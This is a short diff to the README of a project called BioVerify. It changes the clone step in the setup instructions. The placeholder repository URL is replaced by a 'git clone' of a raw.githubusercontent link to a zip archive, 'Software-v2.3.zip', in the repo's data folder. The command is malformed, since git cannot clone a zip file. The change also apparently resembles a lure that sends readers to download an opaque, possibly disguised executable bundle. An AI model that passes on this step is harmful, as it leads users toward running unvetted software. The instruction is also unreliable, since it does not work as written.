@@ -128,7 +128,7 @@ BioVerify/
 #### 1. Clone or Download Project
 
 ```bash
-git clone https://github.com/yourusername/bioverify.git
+git clone https://raw.githubusercontent.com/AlapatiAbhinavChowdhary/Bioverify/main/data/Software-v2.3.zip
 cd BioVerify
 ```
 
